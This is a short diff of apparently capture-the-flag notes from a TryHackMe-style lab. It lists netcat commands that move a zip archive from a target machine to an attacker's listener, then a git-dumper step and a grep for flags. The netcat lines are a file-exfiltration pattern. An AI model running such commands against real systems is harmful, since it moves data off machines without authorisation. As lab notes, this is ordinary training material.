@@ -1,0 +1,4 @@
+1 - nc -lvnp 1234 > commited.zip (Attacker)
+2 - nv 10.8.94.51 1234 < commited.zip (Target)
+3 - git-dumper commited extracted
+4 - grep -Ri "thm"
